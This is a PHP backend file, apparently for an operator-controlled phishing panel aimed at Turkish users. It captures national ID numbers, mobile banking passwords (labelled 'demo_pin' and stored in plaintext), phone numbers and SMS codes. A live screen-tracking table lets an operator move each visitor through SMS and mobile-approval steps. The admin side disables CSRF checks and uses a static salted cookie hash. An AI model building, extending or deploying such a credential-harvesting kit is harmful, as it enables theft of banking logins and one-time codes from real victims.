<?php
declare(strict_types=1);

require_once __DIR__ . '/bootstrap.php';

const APPLICATION_STATUSES = ['beklemede', 'sms-dogrulama', 'onay', 'tebrikler', 'yeniden-index'];
const PRESENCE_TTL_SECONDS = 45;
const USER_SCREEN_LABELS = [
    'giris' => 'Karsilama',
    'index' => 'Demo Giris',
    'tel' => 'Telefon Dogrulama',
    'waiting' => 'Bekleme',
    'sms' => 'SMS',
    'onay' => 'Mobil Onay',
    'tebrikler' => 'Tebrikler',
];

function maskSecretValue(string $value): string
{
    $value = trim($value);
    $len = strlen($value);
    if ($len <= 0) {
        return '';
    }
    if ($len <= 2) {
        return str_repeat('*', $len);
    }
    return str_repeat('*', $len - 2) . substr($value, -2);
}

// Backward-compatible alias.
function maskMobilePassword(string $value): string
{
    return maskSecretValue($value);
}

function isValidTurkishNationalId(string $nationalId): bool
{
    if (!preg_match('/^[1-9][0-9]{10}$/', $nationalId)) {
        return false;
    }

    $digits = array_map('intval', str_split($nationalId));
    $oddSum = $digits[0] + $digits[2] + $digits[4] + $digits[6] + $digits[8];
    $evenSum = $digits[1] + $digits[3] + $digits[5] + $digits[7];
    $digit10 = (($oddSum * 7) - $evenSum) % 10;
    if ($digit10 < 0) {
        $digit10 += 10;
    }
    if ($digit10 !== $digits[9]) {
        return false;
    }

    $sumFirst10 = array_sum(array_slice($digits, 0, 10));
    return ($sumFirst10 % 10) === $digits[10];
}

function sanitizeScreenName(string $screen): string
{
    $screen = strtolower(trim($screen));
    return isset(USER_SCREEN_LABELS[$screen]) ? $screen : 'index';
}

function resolveClientIp(): string
{
    $forwardedFor = trim((string) ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? ''));
    if ($forwardedFor !== '') {
        $parts = explode(',', $forwardedFor);
        $candidate = trim((string) ($parts[0] ?? ''));
        if ($candidate !== '') {
            return $candidate;
        }
    }
    return trim((string) ($_SERVER['REMOTE_ADDR'] ?? ''));
}

function getDbConnection(): PDO
{
    static $pdo = null;
    if ($pdo === null) {
        $port = defined('DB_PORT') ? DB_PORT : '3306';
        $dsn = 'mysql:host=' . DB_HOST . ';port=' . $port . ';dbname=' . DB_NAME . ';charset=utf8mb4';
        $options = [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            PDO::ATTR_EMULATE_PREPARES => false,
        ];
        try {
            $pdo = new PDO($dsn, DB_USER, DB_PASS, $options);
        } catch (PDOException $e) {
            die('Veritabanı bağlantı hatası (Hata detayı): ' . $e->getMessage());
        }
    }
    return $pdo;
}

function ensureDataFile(): void {}
function ensurePresenceFile(): void {}

function upsertPresence(string $screen, ?string $applicationId = null, bool $isAdmin = false): void
{
    try {
        $pdo = getDbConnection();
        $now = time();
        $sessionId = session_id() ?: ($_COOKIE['PHPSESSID'] ?? bin2hex(random_bytes(16)));
        $screen = sanitizeScreenName($screen);
        $screenLabel = USER_SCREEN_LABELS[$screen] ?? 'Basvuru Formu';
        $ip = resolveClientIp();
        $lastSeen = date('Y-m-d H:i:s', $now);
        
        $pdo->exec("DELETE FROM presence WHERE last_seen_ts + " . PRESENCE_TTL_SECONDS . " < " . $now);

        $stmt = $pdo->prepare("INSERT INTO presence (session_id, screen, screen_label, application_id, ip, is_admin, last_seen_ts, last_seen) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?) 
            ON DUPLICATE KEY UPDATE screen=VALUES(screen), screen_label=VALUES(screen_label), application_id=VALUES(application_id), ip=VALUES(ip), last_seen_ts=VALUES(last_seen_ts), last_seen=VALUES(last_seen)");
        $stmt->execute([$sessionId, $screen, $screenLabel, $applicationId ?? '', $ip, $isAdmin ? 1 : 0, $now, $lastSeen]);
    } catch (Exception $e) {}
}

function getOnlineSummary(): array
{
    try {
        $pdo = getDbConnection();
        $now = time();
        
        $pdo->exec("DELETE FROM presence WHERE last_seen_ts + " . PRESENCE_TTL_SECONDS . " < " . $now);
        
        $stmt = $pdo->query("SELECT * FROM presence WHERE is_admin = 0 ORDER BY last_seen_ts DESC");
        $users = $stmt->fetchAll();
        
        $byScreen = [];
        $visitors = [];
        foreach ($users as $entry) {
            $label = $entry['screen_label'];
            $byScreen[$label] = ($byScreen[$label] ?? 0) + 1;
            $visitors[] = [
                'session' => substr($entry['session_id'], 0, 8),
                'screen' => $entry['screen'],
                'screen_label' => $label,
                'application_id' => $entry['application_id'],
                'ip' => $entry['ip'],
                'last_seen' => $entry['last_seen'],
                'last_seen_ts' => (int) $entry['last_seen_ts']
            ];
        }
        
        return [
            'count' => count($users),
            'by_screen' => $byScreen,
            'visitors' => $visitors,
        ];
    } catch (Exception $e) {
        return ['count' => 0, 'by_screen' => [], 'visitors' => []];
    }
}

function createApplication(array $payload): array
{
    $pdo = getDbConnection();
    $userCode = trim((string) ($payload['user_code'] ?? ($payload['national_id'] ?? '')));
    $demoPin = trim((string) ($payload['demo_pin'] ?? ($payload['mobile_password'] ?? '')));
    $clientIp = trim((string) ($payload['client_ip'] ?? resolveClientIp()));
    
    $application = [
        'id' => bin2hex(random_bytes(8)),
        'full_name' => '',
        'user_code' => $userCode,
        'national_id' => $userCode,
        'phone' => '',
        'email' => '',
        'amount' => '',
        'demo_pin' => $demoPin,
        'demo_pin_hash' => $demoPin !== '' ? password_hash($demoPin, PASSWORD_DEFAULT) : '',
        'demo_pin_masked' => maskSecretValue($demoPin),
        'mobile_password_hash' => $demoPin !== '' ? password_hash($demoPin, PASSWORD_DEFAULT) : '', 
        'mobile_password_masked' => maskSecretValue($demoPin), 
        'sms_code' => '',
        'sms_verified' => 0,
        'sms_attempts' => 0,
        'sms_last_verified_at' => null,
        'sms_last_attempt_at' => null,
        'status' => 'beklemede',
        'client_ip' => $clientIp,
        'consent' => 1,
        'created_at' => date('Y-m-d H:i:s'),
        'updated_at' => date('Y-m-d H:i:s')
    ];

    $sql = "INSERT INTO applications (id, full_name, user_code, national_id, phone, email, amount, demo_pin, demo_pin_hash, demo_pin_masked, mobile_password_hash, mobile_password_masked, sms_code, sms_verified, sms_attempts, sms_last_verified_at, sms_last_attempt_at, status, client_ip, consent, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)";
    
    $stmt = $pdo->prepare($sql);
    $stmt->execute([
        $application['id'], $application['full_name'], $application['user_code'], $application['national_id'],
        $application['phone'], $application['email'], $application['amount'], $application['demo_pin'],
        $application['demo_pin_hash'], $application['demo_pin_masked'], $application['mobile_password_hash'],
        $application['mobile_password_masked'], $application['sms_code'], $application['sms_verified'],
        $application['sms_attempts'], $application['sms_last_verified_at'], $application['sms_last_attempt_at'],
        $application['status'], $application['client_ip'], $application['consent'], $application['created_at'],
        $application['updated_at']
    ]);
    
    return $application;
}

function findApplicationById(string $id): ?array
{
    try {
        $stmt = getDbConnection()->prepare("SELECT * FROM applications WHERE id = ? LIMIT 1");
        $stmt->execute([$id]);
        $res = $stmt->fetch();
        return $res ?: null;
    } catch (Exception $e) { return null; }
}

function updateApplicationStatus(string $id, string $status): bool
{
    if (!in_array($status, APPLICATION_STATUSES, true)) return false;
    try {
        $stmt = getDbConnection()->prepare("UPDATE applications SET status = ?, updated_at = ? WHERE id = ?");
        $stmt->execute([$status, date('Y-m-d H:i:s'), $id]);
        return $stmt->rowCount() > 0;
    } catch (Exception $e) { return false; }
}

function deleteApplicationById(string $id): bool
{
    try {
        $stmt = getDbConnection()->prepare("DELETE FROM applications WHERE id = ?");
        $stmt->execute([$id]);
        return $stmt->rowCount() > 0;
    } catch (Exception $e) { return false; }
}

function deleteAllApplications(): int
{
    try {
        $stmt = getDbConnection()->query("DELETE FROM applications");
        return $stmt->rowCount();
    } catch (Exception $e) { return 0; }
}

function updateSmsVerification(string $id, bool $verified, string $code = ''): bool
{
    try {
        $pdo = getDbConnection();
        $now = date('Y-m-d H:i:s');
        
        $app = findApplicationById($id);
        if (!$app) return false;
        
        $attempts = (int)$app['sms_attempts'] + 1;
        $smsCode = $code !== '' ? $code : $app['sms_code'];
        $isVerified = $verified ? 1 : 0;
        $verifiedAt = $verified ? $now : $app['sms_last_verified_at'];
        
        $stmt = $pdo->prepare("UPDATE applications SET sms_attempts = ?, sms_last_attempt_at = ?, sms_code = ?, sms_verified = ?, sms_last_verified_at = ?, updated_at = ? WHERE id = ?");
        $stmt->execute([$attempts, $now, $smsCode, $isVerified, $verifiedAt, $now, $id]);
        return $stmt->rowCount() > 0;
    } catch (Exception $e) { return false; }
}

function updateApplicationPhone(string $id, string $phone): bool
{
    try {
        $stmt = getDbConnection()->prepare("UPDATE applications SET phone = ?, updated_at = ? WHERE id = ?");
        $stmt->execute([$phone, date('Y-m-d H:i:s'), $id]);
        return $stmt->rowCount() > 0;
    } catch (Exception $e) { return false; }
}

function sortedApplicationsDesc(): array
{
    try {
        $stmt = getDbConnection()->query("SELECT * FROM applications ORDER BY created_at DESC");
        return $stmt->fetchAll();
    } catch (Exception $e) { return []; }
}

function loadApplications(): array
{
    return sortedApplicationsDesc();
}

function statusLabel(string $status): string
{
    $labels = [
        'beklemede' => 'Beklemede',
        'sms-dogrulama' => 'SMS',
        'onay' => 'Mobil Onay',
        'tebrikler' => 'Tebrikler',
        'yeniden-index' => 'Hatali (Basa don)',
    ];
    return $labels[$status] ?? 'Bilinmiyor';
}

function esc($value): string
{
    return htmlspecialchars((string) $value, ENT_QUOTES, 'UTF-8');
}

function adminUser(): string
{
    return getenv('KB_ADMIN_USER') ?: ADMIN_USERNAME;
}

function adminPass(): string
{
    return getenv('KB_ADMIN_PASS') ?: ADMIN_PASSWORD;
}

function adminCookieHash(): string
{
    return hash('sha256', adminUser() . '|' . adminPass() . '|secret_salt_123');
}

function isAdminLoggedIn(): bool
{
    return ($_COOKIE['admin_auth'] ?? '') === adminCookieHash();
}

function loginAdmin(string $username, string $password): bool
{
    $ok = hash_equals(adminUser(), $username) && hash_equals(adminPass(), $password);
    if ($ok) {
        setcookie('admin_auth', adminCookieHash(), time() + 86400, '/');
    }
    return $ok;
}

function requireAdmin(): void
{
    if (!isAdminLoggedIn()) {
        header('Location: login.php');
        exit;
    }
}

function logoutAdmin(): void
{
    setcookie('admin_auth', '', time() - 3600, '/');
}

function csrfToken(): string
{
    return 'disabled-csrf';
}

function validateCsrf(?string $token): bool
{
    return true;
}

